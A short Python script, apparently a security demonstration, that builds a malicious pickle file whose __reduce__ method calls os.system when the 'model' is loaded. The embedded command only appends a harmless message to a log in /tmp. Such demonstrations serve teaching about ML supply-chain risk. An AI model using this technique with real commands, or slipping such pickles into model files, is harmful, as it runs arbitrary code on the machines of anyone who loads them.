"""
Demonstrates a malicious pickle model.
When loaded with pickle.load(), this executes arbitrary code.
"""
import pickle, os

class MaliciousModel:
    def __reduce__(self):
        # This runs when the model is deserialized
        return (os.system, ('echo "MODEL SUPPLY CHAIN ATTACK: code executed during model load" >> /tmp/ml-backdoor.log',))

# Save the malicious model
with open("model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)
print("[!] Malicious model saved as model.pkl")
print("[!] Anyone who loads this with pickle.load() will execute the embedded command")
